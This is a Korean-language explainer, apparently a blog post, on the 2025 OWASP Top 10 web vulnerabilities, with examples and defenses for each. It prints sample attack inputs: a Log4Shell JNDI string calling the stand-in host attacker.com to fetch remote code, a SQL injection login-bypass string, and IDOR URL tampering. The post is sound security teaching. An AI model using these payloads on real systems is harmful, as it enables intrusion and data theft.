## OWASP TOP10이란?

**OWASP(Open Web Application Security Project)** 는 웹 애플리케이션 보안 향상을 목표로 하는 비영리 재단입니다. OWASP TOP10은 실제 데이터를 바탕으로 가장 심각한 웹 취약점 10가지를 선정해 발표하는 표준 문서로, 2003년에 처음 나왔고 주기적으로 업데이트됩니다.

<br>

2025년 버전은 이전 2021년 버전에서 3개 항목이 새로 진입하거나 재분류됐습니다. 단순한 코드 취약점 중심에서 **공급망·설계·운영 보안** 쪽으로 위협의 무게중심이 옮겨가고 있습니다는 게 핵심 변화입니다.

<br>

## A01: Broken Access Control — 접근 제어 취약점

> 위험도: 상 | 1위 유지 | 평균 발생률 3.74%

### 개념

내가 볼 권한이 없는 데이터나 기능에 접근할 수 있게 되는 취약점입니다. OWASP가 테스트한 애플리케이션 모두에서 어떤 형태로든 발견될 만큼 TOP10 중 가장 광범위한 항목입니다.

<br>

접근 제어는 반드시 서버 쪽 코드에서 처리해야 합니다. 클라이언트(JavaScript 등)에서만 막아놓으면 공격자가 간단히 우회할 수 있습니다.

<br>

주요 유형:
- **IDOR(Insecure Direct Object Reference)**: URL이나 파라미터의 식별자를 바꿔서 다른 사람의 데이터에 접근
- **강제 브라우징(Forced Browsing)**: URL을 직접 추측해서 인증·권한이 필요한 페이지에 접근
- **권한 상승**: 일반 사용자가 관리자 기능을 실행

### 예시

쇼핑몰 주문 내역 조회 URL이 다음과 같다고 하자.

```
https://shop.com/order?id=1001
```

<br>

여기서 `id=1002`, `id=1003`으로 바꿔서 요청했을 때 서버가 소유자를 확인하지 않으면 다른 사람의 주문 내역이 그대로 넘어옵니다. 이게 IDOR 공격입니다.

<br>

또는 관리자 페이지 URL을 직접 입력했을 때:

```
https://shop.com/admin/users
```

<br>

로그인은 되어 있지만 관리자 권한이 없는데도 접근이 됩니다면 강제 브라우징 취약점입니다.

<br>

## A02: Security Misconfiguration — 보안 설정 오류

> 위험도: 상 | ↑ 5위→2위 | 평균 발생률 3.00%

### 개념

보안 설정이 잘못되어 있거나 기본값 그대로 방치된 상태입니다. "설치는 했지만 보안 설정은 안 했다"는 상황 전반이 여기에 해당합니다. TOP10 중 평균 발생률이 가장 높은 항목입니다.

<br>

주요 유형:
- 기본 계정·패스워드 미변경
- 불필요한 포트·서비스·기능 활성화
- 에러 메시지에 스택 트레이스 등 내부 정보가 그대로 노출
- 클라우드 저장소 권한이 공개(public)로 설정
- 보안 HTTP 헤더 미설정

### 예시

Django 앱을 프로덕션 서버에 배포했는데 `DEBUG = True` 설정을 그대로 뒀다고 가정하겠습니다. 오류가 발생하면 아래처럼 스택 트레이스와 서버 내부 설정이 브라우저에 통째로 출력됩니다.

```
OperationalError at /login
no such table: auth_user
...
DATABASES = {'default': {'ENGINE': 'django.db.backends.sqlite3', 'NAME': '/var/www/myapp/db.sqlite3', ...}}
```

<br>

공격자는 여기서 DB 경로, 프레임워크 버전, 설치 경로를 파악해 다음 공격의 발판으로 삼습니다.

<br>

## A03: Software Supply Chain Failures — 소프트웨어 공급망 실패

> 위험도: 상 | 🆕 신규 진입 | 평균 발생률 5.72%

### 개념

내가 짠 코드가 아니라 **외부 라이브러리, 패키지, 빌드 도구, CI/CD 파이프라인**을 통해 악성 코드가 유입되는 공격입니다. 한 번 뚫리면 그 라이브러리를 쓰는 프로젝트가 전부 영향을 받아 파급 범위가 엄청나게 넓습니다.

### 예시

2021년의 **Log4Shell(CVE-2021-44228)** 이 대표적입니다. Java에서 광범위하게 쓰이는 로깅 라이브러리 Log4j에서 원격 코드 실행(RCE) 취약점이 발견됐습니다.

<br>

공격자는 로그에 기록될 HTTP 헤더나 입력값에 특수 문자열을 삽입했습니다.

```
User-Agent: ${jndi:ldap://attacker.com/exploit}
```

<br>

Log4j가 이 문자열을 JNDI 조회로 해석해 공격자의 LDAP 서버에 연결하고, 악성 Java 클래스를 받아와 서버에서 실행합니다. 이 라이브러리를 쓰는 서버 수십만 대가 하루 만에 공격 대상이 됐습니다.

<br>

## A04: Cryptographic Failures — 암호화 실패

> 위험도: 중상 | ↓ 2위→4위 | 평균 발생률 3.80%

### 개념

데이터를 보호해야 할 암호화가 없거나, 약하거나, 잘못 구현된 경우입니다. 

<br>

주요 유형:
- 민감 데이터(비밀번호, 카드 번호)를 평문으로 저장·전송
- MD5, SHA1처럼 이미 취약점이 알려진 해시 알고리즘 사용
- 암호화 키를 소스 코드에 하드코딩
- HTTPS 미적용 또는 다운그레이드 허용

### 예시

회원 비밀번호를 MD5로만 해시해서 DB에 저장했다고 하자.

```
사용자 비밀번호: password123
MD5 해시:       482c811da5d5b4bc6d497ffa98491e38
```

<br>

공격자가 DB를 탈취하면 **레인보우 테이블(rainbow table)** — 미리 계산해둔 해시 값 목록 — 을 이용해 몇 초 안에 원본 비밀번호를 복원할 수 있습니다. 솔트(salt) 없이 쓰면 특히 취약하고, 솔트를 붙이더라도 MD5는 연산이 너무 빠르기 때문에 GPU 브루트포스에 여전히 뚫립니다.

<br>

안전하게 하려면 Argon2, bcrypt, PBKDF2 같은 **느린 해시 함수(slow hash)** 에 솔트를 함께 써야 합니다. 연산에 시간이 걸리도록 설계되어 있어 대량으로 반복 시도하는 게 현실적으로 불가능해집니다.

<br>

## A05: Injection — 인젝션

> 위험도: 상 | ↓ 3위→5위 | 평균 발생률 3.08%

### 개념

사용자 입력값이 검증 없이 인터프리터(SQL 엔진, OS 쉘, LDAP 서버 등)로 넘어가서 의도하지 않은 명령이 실행되는 취약점입니다. 순위는 내려갔지만 TOP10 중 보고된 취약점 사례가 가장 많습니다. 대부분이 SQL Injection과 XSS입니다.

### 예시 — SQL Injection

로그인 기능이 아래처럼 동적 쿼리로 구현되어 있습니다고 하자.

```python
query = "SELECT * FROM users WHERE id='" + user_id + "' AND pw='" + password + "'"
```

<br>

공격자가 `user_id` 필드에 아래를 입력하고 `pw`는 아무 값이나 넣습니다.

```
' OR '1'='1' --
```

<br>

완성된 쿼리는 이렇게 됩니다.

```sql
SELECT * FROM users WHERE id='' OR '1'='1' --' AND pw='anything'
```

<br>

`--`는 SQL 주석이라 뒤 조건이 전부 무시됩니다. `'1'='1'`이 항상 참이니까 WHERE 조건이 사실상 없어져 모든 레코드가 반환됩니다. 비밀번호 없이 로그인이 됩니다.

<br>

방어: **Prepared Statement** 를 쓰면 입력값이 SQL 코드가 아닌 순수한 데이터로만 처리됩니다.

```python
cursor.execute("SELECT * FROM users WHERE id=? AND pw=?", (user_id, password))
```

<br>

## A06: Insecure Design — 안전하지 않은 설계

> 위험도: 중 | ↓ 4위→6위 | 평균 발생률 1.86%

### 개념

코드 버그가 아니라 **설계 자체의 결함**입니다. 아무리 코드를 완벽하게 짜도 설계가 잘못되어 있으면 고칠 수가 없습니다. 위협 모델링 부재, 비즈니스 로직 취약점 등이 여기에 해당합니다.

### 예시

비밀번호 찾기 기능을 "어머니의 결혼 전 성" 같은 보안 질문으로 구현했다고 하자. 이 정보는 SNS나 지인을 통해 쉽게 알 수 있어 추가 인증이 사실상 무의미하다. 코드를 아무리 잘 짜도 설계 자체가 잘못됐기 때문에 코드 수정만으로는 해결이 안 됩니다.

<br>

또 다른 예시: 영화관 예매 시스템이 "단체 20인 이상 예약 시 50% 할인"을 적용하는데, 20인 예약 후 19인을 취소해도 할인이 그대로 유지됩니다면 비즈니스 로직 취약점입니다. 코드는 정상 동작하지만 이 케이스를 애초에 고려하지 않은 설계 문제입니다.

<br>

## A07: Authentication Failures — 인증 실패

> 위험도: 상 | 7위 유지 | 평균 발생률 2.92%

### 개념

인증(로그인) 프로세스의 허점입니다. 공격자가 다른 사람 계정으로 로그인하거나 세션을 탈취할 수 있는 상황이 모두 해당됩니다.

<br>

주요 유형:
- **Credential Stuffing**: 다른 서비스에서 유출된 ID·비밀번호 조합을 그대로 대입
- **Brute Force**: 비밀번호를 계속 시도 — 잠금 정책이 없으면 이론상 전부 시도 가능
- 약한 비밀번호 허용 (예: `1234`, `password`)
- MFA(다중 인증) 미적용
- 세션 만료·무효화 부재

### 예시

어떤 서비스 DB가 유출되어 `user123:MyP@ssw0rd` 조합이 다크웹에 풀렸다고 하자. 같은 비밀번호를 다른 사이트에서도 쓰고 있습니다면 공격자는 유출된 목록을 자동화 도구로 다른 서비스에 그대로 대입합니다(Credential Stuffing).

<br>

`Winter2024` → `Winter2025` → `Winter2026`처럼 규칙적으로 바꾸는 패턴도 하이브리드 공격 도구가 자동으로 예측합니다.

<br>

방어: MFA 적용, 로그인 실패 횟수 제한(Rate Limiting), 유출 비밀번호 목록과 대조.

<br>

## A08: Software or Data Integrity Failures — 소프트웨어·데이터 무결성 실패

> 위험도: 중 | 8위 유지 | 평균 발생률 2.75%

### 개념

신뢰할 수 없는 소스에서 온 소프트웨어나 데이터를 검증 없이 그냥 믿어버리는 취약점입니다. 자동 업데이트, CI/CD 파이프라인, 역직렬화(deserialization) 등이 주요 공격 경로입니다.

### 예시

**역직렬화 공격**: 웹 앱이 사용자 상태를 직렬화(serialize)해서 HTTP 파라미터나 세션에 저장하고, 이걸 검증 없이 역직렬화(deserialize)합니다고 하자.

```
HTTP 파라미터: viewState=rO0ABXNyABd... (base64 인코딩된 Java 객체)
```

<br>

공격자가 이 값을 조작해 악성 Java 객체를 넣으면, 서버가 역직렬화하는 순간 그 안에 담긴 코드가 실행됩니다(RCE). "요청에서 온 거니까 믿어도 됩니다"고 가정했기 때문입니다.

<br>

또 다른 예시: 소프트웨어 자동 업데이트 시스템이 디지털 서명을 검증하지 않으면, 공격자가 업데이트 서버를 뚫고 악성 업데이트를 배포할 수 있습니다.

<br>

## A09: Security Logging and Alerting Failures — 보안 로깅·알림 실패

> 위험도: 중 | 9위 유지 | 평균 발생률 3.91%

### 개념

공격이 일어나고 있거나 이미 일어났는데도 알아채지 못하는 취약점입니다. 로깅과 모니터링이 없으면 침해를 인식할 수 없고, 뒤늦게 발견해도 피해 범위를 파악하기가 어렵습니다. 직접적인 공격이 아니라 **다른 공격의 탐지를 방해**한다는 점에서 성격이 좀 다릅니다.

### 예시

미국의 한 소아 보건 웹사이트가 **7년간** 침해 사실을 몰랐다. 로깅과 알림 시스템이 제대로 갖춰져 있지 않았기 때문입니다. 결국 350만 명의 의료 기록이 노출됐습니다.

<br>

인도의 한 항공사는 **10년치** 여객 정보(여권, 신용카드 정보)가 유출됐다는 걸 한참 뒤에야 파악했다. 유럽의 한 항공사는 40만 건의 결제 기록이 유출된 후 GDPR 위반으로 **2천만 파운드(약 330억 원)** 의 벌금을 맞았다. 이상 징후를 잡아낼 로깅과 알림 체계가 없었던 게 공통점입니다.

<br>

## A10: Mishandling of Exceptional Conditions — 예외 처리 부실

> 위험도: 중 | 🆕 신규 진입 | 평균 발생률 2.95%

### 개념

프로그램이 예상치 못한 상황(오류, 예외, 엣지 케이스)을 제대로 처리하지 못할 때 생기는 취약점입니다. 예외 처리 실패는 크게 세 가지입니다.

1. **예방 부족**: 비정상 상황 자체를 막지 못함
2. **감지 실패**: 비정상 상황이 발생했다는 걸 인식하지 못함
3. **부실 대응**: 비정상 상황 이후 적절한 처리가 없음

<br>

그 중 **실패 개방(Fail Open)** 이 특히 위험합니다. 부실 대응의 대표적인 유형으로, 오류가 났을 때 보안 조건을 무시하고 그냥 통과시키는 방향으로 동작하는 경우입니다.

### 예시

**정보 유출**: 로그인 처리 중 DB 오류가 났을 때 아래처럼 오류 메시지가 그대로 출력됩니다면.

```
SQL Error: ORA-01017: invalid username/password; logon denied
Database version: Oracle Database 19c
Server: 192.168.1.105
```

<br>

공격자는 DB 종류, 버전, 내부 IP를 파악해 알려진 취약점을 찾거나 네트워크 구조를 파악하는 데 씁니다.

<br>

**실패 개방 예시**: 인증 서버가 응답하지 않을 때 "연결 안 됨 → 일단 통과"로 처리하면, 공격자가 인증 서버를 의도적으로 마비시켜서 인증 없이 시스템에 들어올 수 있습니다.
